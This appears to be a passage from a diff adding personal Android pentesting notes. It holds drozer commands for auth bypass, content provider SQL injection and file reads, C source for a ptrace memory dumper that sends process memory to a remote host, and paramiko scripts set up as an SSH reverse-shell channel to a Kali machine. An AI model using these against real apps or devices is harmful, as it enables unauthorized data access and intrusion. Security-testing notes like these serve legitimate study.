+					we can attach a debugger to the process, using adb, and 
+					step through the code.
+			
+			Launching Activities (looking for auth bypass):
+				Which activities are exported by app:
+					run app.activity.info -a <com.app.bla> -u
+				Find interesting “activities” to launch (try them all):
+					help app.activity.start
+					run app.activity.start --component com.app.bla com.app.bla.listshit 
+						Check mobile device!
+						If the listshit comes up without you authenticating->authbypass!
+
+					am start -n com.app.bla/ACTIVITY_NAME -e KEYNAME VALUE
+
+			Reading from Content Providers (Databases, local files) (see doc:
+			https://www.mwrinfosecurity.com/system/assets/559/original/mwri_drozer-users-guide_2013-09-11.pdf)
+				run app.provider.info -a <com.app.bla>
+					Are there database permissions or are they null?
+				
+				Scan for Content Provider Vulnerabilities:
+				run scanner.provider.injection -a com.app.bla
+
+				run scanner.provider.finduris -a <com.app.bla>
+				If DB is Queryable:
+				run app.provider.query content://com.app.bla.DBContent/Users
+				run app.provider.query content://com.app.bla.DBContent/Users/ --projection "'"
+
+				File System-backed Content Provider:
+				run app.provider.read content://com.app.FilebackProvider/etc/hosts
+				run app.provider.download content://com.app.FilebackProvider/data/data/db.db /home/jt/
+					# Get path of apk file from:
+					run app.package.info -a <com.app.bla>
+					run app.provider.download /data/data/<com.app.bla>/com.app.bla.apk /home/jt/com.app.bla.apk
+
+				Exploiting Content Provider
+				run app.provider.info -a [package name]
+				run scanner.provider.finduris -a [package name]
+				run app.provider.query [uri]
+				run app.provider.update [uri] --selection [conditions] [selection arg] [column] [data]
+				run scanner.provider.sqltables -a [package name]
+				run scanner.provider.injection -a [package name]
+				run scanner.provider.traversal -a [package name]
+
+
+
+
+			Interacting with Services:
+				run app.service.info -a com.airbnb.android
+					Null permissions on a service?
+				run app.service.send --msg 1 2 3 com.app.com com.app.com.services.AirDreamService
+	
+				am start-service -n com.airbnb.android/SERVICE_NAME
+				
+
+
+			Other Modules:
+				list			-list all modules in DZ	
+				shell
+				tools.file.upload
+				tools.setup.busybox
+
+			SQL Injection:
+				run scanner.provider.injection -a com.app.bla
+
+				run app.provider.query content://com.app.bla.providers.UserContentProvider --projection "*"
+				run app.provider.query content://com.app.bla.providers.UserContentProvider --projection "* from SQLITE_MASTER WHERE type='table';=="
+				run app.provider.query content://com.app.bla.providers.UserContentProvider --projection "* from users"
+				run app.provider.query content://com.app.bla.providers.UserContentProvider --projection "* from android_metadata;--"
+				run app.provider.query content://com.app.bla.providers.UserContentProvider --projection "* from sqlite_sequence;--"
+				
+
+			Broadcast Receivers:
+				run app.broadcast.info -a com.app.bla
+				run app.broadcast.info -a [package name]
+				run app.broadcast.send --component [package name] [component name] --extra [type] [key] [value]
+				run app.broadcast.sniff --action [action]
+
+			Null Intent fuzzing:
+				List broadcast Receivers
+					run app.broadcast.info -a com.app.bla
+				On Android device, send a null broadcast to the application receiver listed above
+					adb shell
+					am broadcast -n <app name>/<broadcast receiver>
+					#am broadcast -n com.airbnb.android/com.airbnb.android.ReferralBroadcastReceiver  
+					am broadcast -n <app name>/<broadcast receiver> -es blablabla
+						Does blablaba show up in app?
+				Check log cat to see if the service has died
+	
+
+
+			
+			
+			Exploiting Service
+				run app.service.info -a [package name]
+				run app.service.start --action [action] --component [package name] [component name]
+				run app.service.send [package name] [component name] --msg [what] [arg1] [arg2] --extra [type] [key] [value] --bundle-as-obj
+
+
+
+
+	Experimental:
+	Androguard for reverse engineering and Static analysis
+		androlyze.py -s		#brings up interactive mode
+			a,d,dx = AnalyzeAPK(“./app.apk”, decompiler=“dad”)
+				Gather information:
+					permissions
+					activities user will interact with
+					Services that the app runs
+					Intent receivers
+			Check permissions:
+			a.permissions
+
+			Find which classes and methods use the permissions:
+			show_Permissions(dx)
+				Look for interesting methods, such as “doPost” methods
+				d.CLASS_Lcom_yougetitback_androidapplication_ConfirmPin METHOD_doPost.show()
+				#d.CLASS_Lcom_google_android_gms_auth_GoogleAuthUtil
+
+
+			Get Activities:
+			a.get_activities()
+			a.get_main_activity()
+
+			Get Services:
+			a.get_services()
+
+			Get Receivers
+			a.get_receivers()
+
+			Look at methods available for a Receiver a given class:
+			for meth in d.CLASS_Lcom_google_android_gms_auth_GoogleAuthUtil.get_methods(): meth.show_info()	
+
+			For Broadcast Receivers, the onReceive method serves as ann entry point so you 
+			can look for cross-references, or xrefs for short, from that method to get an 
+			idea of control flow.  
+			Create an xref with d.create_xref and then call show_xref on the object 
+			representing the onReceive method:
+			d.create_xref()
+			d.CLASS_Lcom_yougetitback_androidapplication_SmsIntentReceiver METHOD_onReceive.show_xref() 
+			d.CLASS_Lcom_yougetitback_androidapplication_SmsIntentReceiver METHOD_getMessagesFromIntent.source()
+
+	GenyMotion:
+		http://www.genymotion.com -> Android emulator using VirtualBox.  Very FAST!
+		Install VirtualBox -> REBOOT
+		Install Genymotion -> drag and drop both files into Applications
+		Run Genymotion
+		Run Genymotion Shell -> devices list
+		from Android SDK:
+			./avd server-start
+			./avd shell <IP from devices list>
+
+
+		See my IP address: 
+			Settings -> Wi-Fi -> Settings (3 dots) -> Advanced = shows IP and 
+				MAC for Bridged Network
+
+		Proxy Settings:
+			Settings -> Wi-Fi -> Long Tap on WiredSSID -> Modify network
+
+		Use GenyMotion for installing Intel Compiled packages
+			Be on 4.2.2 kernel/API i.e. HTC One 4.2.2 API 17 - 1080x1920
+
+
+	
+
+
+	Santoku - Mobile Forensics/Pentesting VM
+
+	A.R.E (Android Reverse Engineering) VM -
+	http://www.honeynet.org/node/783
+	Contains:
+		Androguard
+		Android sdk/ndk
+		Apktool
+		Axmiprinter
+		Ded
+		Dex2jar
+		DroidBox
+		Jad
+		Smali/Baksmali
+
+	
+	Other resources I have heard are good:
+
+	1. Smartphone Pentesting Framework -
+	http://www.bulbsecurity.com/smartphone-pentest-framework/
+
+	Stuff to get:
+
+	santoku linux distro
+	androidtamer linux distro
+	
+	Mike Park Presentation:
+	https://www.owasp.org/images/c/cf/ASDC12-Mobile_Application_Security_Who_how_and_why.pdf
+
+	Disassemble and reassemble APK file:
+	https://code.google.com/p/easy-apk-dissassembler/wiki/DisassembleAPK
+
+	Setting application to Debug mode and Adroid Manifest file:
+	http://developer.android.com/tools/device.html
+
+		Determine if running on a rooted device:
+	http://stackoverflow.com/questions/1101380/determine-if-running-on-a-rooted-device
+	http://stackoverflow.com/questions/10028226/protect-android-application-on-rooted-phone
+
+	Cydia Substrate:
+	https://play.google.com/store/apps/details?id=com.saurik.substrate&hl=en
+
+	Android Reversing -> From appuse creator
+	https://www.owasp.org/images/d/d6/OWASP_IL_2013_10_Erez_Metula_The_ReFrameworker_Android_runtime_manipulator.pdf
+	https://www.youtube.com/watch?v=mFW2ST4-b4s
+
+	Interesting Android talk:
+	https://www.blackhat.com/us-13/archives.html#Brodie
+
+
+
+**************************************************************
+memdump howto
+**************************************************************
+
+Open Android Studio -> Configure -> SDK Tools -> Check: CMake, LLDB and NDK -> Click Apply/Ok
+
+mkdir jni
+cd jni
+Create a file Application.mk and put the following in it:
+APP_ABI := armeabi armeabi-v7a
+#APP_PLATFORM := android-16         Add this if running it on Android 4.1 or newer
+
+Create a file Android.mk and put the following in it:
+# A simple test for the minimal standard C++ library
+#
+
+LOCAL_PATH := $(call my-dir)
+
+include $(CLEAR_VARS)
+LOCAL_MODULE := dump_android_memory
+LOCAL_SRC_FILES := dump_android_memory.c
+include $(BUILD_EXECUTABLE)
+
+
+Create a file memdump.c and put the following in it (may have to change “int main” to “void main”) if you get errors:
+#include <stdio.h>
+#include <stdlib.h>
+#include <limits.h>
+#include <sys/ptrace.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+void dump_memory_region(FILE* pMemFile, unsigned long start_address, long length, int serverSocket)
+{
+    unsigned long address;
+    int pageLength = 4096;
+    unsigned char page[pageLength];
+    fseeko(pMemFile, start_address, SEEK_SET);
+
+    for (address=start_address; address < start_address + length; address += pageLength)
+    {
+        fread(&page, 1, pageLength, pMemFile);
+        if (serverSocket == -1)
+        {
+            // write to stdout
+            fwrite(&page, 1, pageLength, stdout);
+        }
+        else
+        {
+            send(serverSocket, &page, pageLength, 0);
+        }
+    }
+}
+
+int main(int argc, char **argv) {
+
+    if (argc == 2 || argc == 4)
+    {
+        int pid = atoi(argv[1]);
+        long ptraceResult = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
+        if (ptraceResult < 0)
+        {
+            printf("Unable to attach to the pid specified\n");
+            return;
+        }
+        wait(NULL);
+
+        char mapsFilename[1024];
+        sprintf(mapsFilename, "/proc/%s/maps", argv[1]);
+        FILE* pMapsFile = fopen(mapsFilename, "r");
+        char memFilename[1024];
+        sprintf(memFilename, "/proc/%s/mem", argv[1]);
+        FILE* pMemFile = fopen(memFilename, "r");
+        int serverSocket = -1;
+        if (argc == 4)
+        {   
+            unsigned int port;
+            int count = sscanf(argv[3], "%d", &port);
+            if (count == 0)
+            {
+                printf("Invalid port specified\n");
+                return;
+            }
+            serverSocket = socket(AF_INET, SOCK_STREAM, 0);
+            if (serverSocket == -1)
+            {
+                printf("Could not create socket\n");
+                return;
+            }
+            struct sockaddr_in serverSocketAddress;
+            serverSocketAddress.sin_addr.s_addr = inet_addr(argv[2]);
+            serverSocketAddress.sin_family = AF_INET;
+            serverSocketAddress.sin_port = htons(port);
+            if (connect(serverSocket, (struct sockaddr *) &serverSocketAddress, sizeof(serverSocketAddress)) < 0)
+            {
+                printf("Could not connect to server\n");
+                return;
+            }
+        }
+        char line[256];
+        while (fgets(line, 256, pMapsFile) != NULL)
+        {
+            unsigned long start_address;
+            unsigned long end_address;
+            sscanf(line, "%08lx-%08lx\n", &start_address, &end_address);
+            dump_memory_region(pMemFile, start_address, end_address - start_address, serverSocket);
+        }
+        fclose(pMapsFile);
+        fclose(pMemFile);
+        if (serverSocket != -1)
+        {
+            close(serverSocket);
+        }
+
+        ptrace(PTRACE_CONT, pid, NULL, NULL);
+        ptrace(PTRACE_DETACH, pid, NULL, NULL);
+    }
+    else
+    {
+        printf("%s <pid>\n", argv[0]);
+        printf("%s <pid> <ip-address> <port>\n", argv[0]);
+        exit(0);
+    }
+}
+
+
+cd .. out of the jni directory and run:
+ndk-build
+
+copy the memdump file to your android device.
+
+
+
+**************************************************************
+Write Android Apps in Python
+**************************************************************
+Requires 2 VM’s and 1 Android Device:
+
+
+
+On Kivy Buildozer:
+	Get at https://kivy.org/#download
+		kivy-bulldozer-vm-2.0.zip
+
+	Login: kivy/kivy
+
+	Install Kivy support in Python:
+		sudo add-apt-repository ppa:kivy-team/kivy
+		sudo apt-get update
+		sudo apt-get install python-kivy idle
+
+	Install dependancies for SSH reverse shell
+		sudo apt-get install python-dev libffi-dev libssl-dev
+		sudo pip install cryptography
+		sudo pip install pycrypto
+		sudo pip install paramiko		
+		
+
+	All python scripts should be called main.py before converting to APK
+
+	Sample Python program (main.py)for converting to APK file
+		#qpy:kivy
+
+		from kivy.app import App
+		from kivy.uix.button import Button
+
+		class MyApp(App):
+		    def build(self):
+		        return Button(text="Howdy")
+
+		MyApp().run()
+	
+	
+	Run:
+	buildozer init
+		will create a buildozer.spc file
+		edit this the buildozer.spc file to be specific to the project
+		    Change package.name, requirements, permissions, log_level
+			requirements = kivy,paramiko,pycrypto,ecdsa
+			orientation = portrait
+			fullscreen = 0
+			android.permissions = INTERNET (uncomment)
+
+	buildozer android debug
+		builds project
+		-v verbose mode buildozer -v android debug
+
+	
+	Other command that could be helpful:
+	
+	buildozer android deploy run logcat
+		starts the app on device and collect the error log
+
+	buildozer android debug deply run logcat
+		will do everything above in one command
+
+
+	Update Buildozer:
+		sudo pip install -U buildozer
+
+	Update Kivy and other modules:
+		rm -rf ~/.buildozer/android/packages	
+	
+	
+	Client script “client.py” for connecting to server on Kali:
+		import paramiko
+
+		def connect():
+			client = paramiko.SSHClient()
+			client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+			client.connect(‘192.168.1.123’, username=‘jimmy’, password=‘password’)
+			chan = client.get_transport()open_session()
+			chan.send(“This message is from the client script”)
+			print chan.recv(1024)
+
+		connect()		
+		
+
+
+
+On Android:
+	Install “AirDroid” from play store
+		“Screenshot” icon will mirror display of device
+
+		Access AirDroid by going to http://192.168.1.132:8888
+
+
+	Install “QPython - Python for Android” by QPythonLab
+		Install Kivy from the QPYPI section of the App
+
+		storage/emulated/0/qpython/lib/python2.7/site-packages 
+			location of 3rd party libs
+		/storage/emulated/0/qpython/scripts	
+			location of scripts directory
+
+
+	Inside QPython run OS commands
+		import os
+		os.getcwd()			get current working directory
+		os.listdir(os.getcwd())		ls of current working directory
+		os.chdir(“/storage”)
+		os.uname()			linux info
+		
+
+	Get shell on Android device (assumes rooted device):
+		import subprocess
+		proc= subprocess.Popen(‘su’)
+		(out.err)= proc.communicate()
+
+
+On Kali:
+	apt-get install idle
+
+	Install dependancy’s for Reverse SSH Tunnel
+		pip install pycrypto
+		pip install paramiko #SSHv2 protocol 
+		git clone https://github.com/paramiko/paramiko
+		cp paramiko/demos/test_rsa.key .
+
+	Paramiko Download Link
+		https://pypi.python.org/pypi/paramiko/1.16.0
+
+	Ecdsa Download Link
+		https://pypi.python.org/pypi/ecdsa/0.13
+
+	Compiled pycrypto for Qpython 2.7
+		https://code.google.com/archive/p/python-for-android/downloads?page=3
+
+	*Bug link
+		https://github.com/kuri65536/python-for-android/issues/59
+
+
+	create /root/server.py and put the following in it:
+
+import socket
+import sys
+import threading
+import paramiko
+
+
+host_key = paramiko.RSAKey(filename='/root/test_rsa.key')
+
+class Server (paramiko.ServerInterface):
+    def __init__(self):
+        self.event = threading.Event()
+
+    def check_channel_request(self, kind, chanid):
+        if kind == 'session':
+            return paramiko.OPEN_SUCCEEDED
+        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+
+    def check_auth_password(self, username, password):
+        if (username == 'jimmy') and (password == 'password'):
+            return paramiko.AUTH_SUCCESSFUL
+        return paramiko.AUTH_FAILED
+
+try:
+    global sock
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(('0.0.0.0' , 22))
+    sock.listen(1)
+    print '[+] Listening for connection ...'
+
+except Exception, e:
+    print '[-] Listen/Bind failed: ' + str(e)
+
+try:
+    client, addr = sock.accept()
+    print '[+] Got a connection from ' + str(addr)
+    t = paramiko.Transport(client)
+    t.load_server_moduli()
+    t.add_server_key(host_key)
+    server = Server()
+    t.start_server(server=server)
+    global chan
+    chan = t.accept(1)
+    print chan.recv(1024)
+    chan.send(“This message is from the server script“)
+
+except:
+    print "[-] Connection Terminated!"
+    pass
+
+
+
+
